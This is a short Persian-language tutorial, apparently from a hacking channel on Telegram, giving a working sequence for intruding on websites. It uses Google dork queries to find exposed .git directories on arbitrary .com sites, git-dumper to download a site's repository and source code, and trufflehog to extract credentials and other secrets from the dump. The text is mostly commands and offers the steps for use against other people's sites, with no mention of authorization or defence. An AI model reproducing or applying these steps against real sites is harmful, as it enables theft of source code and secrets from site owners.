یکی از کارهایی که میتونید  برای پیدا کردن فایل git. استفاده از این دورک
site:*.com intext:"Index Of .git"
site:*.com inurl:"Index Of .git"

که میتوانید ببنید ایا این مسیر از سایت باز هست یا نه 

حالا پا رو کمی فراتر بزاریم 
میتونیم با این git-dumper کل فایل git. رو دانلود کنیم حتی میتونید کل سورس کد سایت رو هم دانلود کنید نحوه نصب:
pip install git-dumper

که برای dump کردن فایل های git.  باید این دستور رو بزنید 
git-dumper https://site.com/.git dump
git-dumper == دستور
https://site.com/.git/ == اسم سایت 
dump == اسم یه پوشه دلخواه

حالا همه فایل های git.  رو دانلود کردید و ممکنه سورس کد رو هم dump کرده باشید

حالا باید این ابزار رو نصب کنید:
git clone https://github.com/trufflesecurity/trufflehog.git
cd trufflehog; go install
 
بعد از اون میتونید با استفاده trufflehog بچرخید و دیتاهای حساس رو از فایل هایی که dump کردید رو به دست بیارید 
trufflehog filesystem dump

📌@hackhaven_channel


---

